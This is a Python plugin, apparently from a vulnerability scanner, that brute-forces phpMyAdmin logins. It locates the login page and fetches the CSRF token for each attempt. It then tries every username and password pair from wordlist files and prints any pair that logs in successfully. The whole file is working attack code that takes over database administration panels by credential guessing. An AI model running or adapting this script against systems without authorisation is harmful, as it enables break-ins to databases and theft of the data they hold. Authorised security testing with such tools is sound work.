#!/usr/bin/env python3

'''
name: Phpmyadmin弱口令漏洞
description: Phpmyadmin弱口令漏洞
'''

import re
import urllib
from app.lib.utils.request import request

class Phpmyadmin_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0",
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_server_type">',
                     'class="disableAjax" title=']
        urls = []
        check_url = ''
        urls.append(self.url + '/index.php')
        urls.append(self.url + '/phpmyadmin/index.php')
        try:
            for url in urls:
                url_req = request.get(url, headers = self.headers)
                if 'input_password' in url_req.text and 'name="token"' in url_req.text and url_req.status_code:
                    check_url = url
            if check_url:
                for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
                    user = user.strip()
                    for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                        if pwd != '':
                            pwd = pwd.strip()
                        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
                        res_html = opener.open(check_url).read()
                        token = re.search('name="token" value="(.*?)" />', res_html.decode('utf-8'))
                        token_hash = urllib.request.quote(token.group(1))
                        postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (user, pwd, token_hash)
                        res = opener.open(check_url, postdata.encode('utf-8'))
                        res_html = res.read()
                        for flag in flag_list:
                            if flag in res_html.decode('utf-8'):
                                print('存在Phpmyadmin弱口令漏洞, user: %s pwd: %s'%(user, pwd))
                                return True

            print('不存在Phpmyadmin弱口令漏洞')
            return False
        except Exception as e:
            print(e)
            print('不存在Phpmyadmin弱口令漏洞')
            return False
        finally:
            pass

if __name__ == "__main__":
    Phpmyadmin_Weakpwd = Phpmyadmin_Weakpwd_BaseVerify('http://127.0.0.1:8080')
    Phpmyadmin_Weakpwd.run()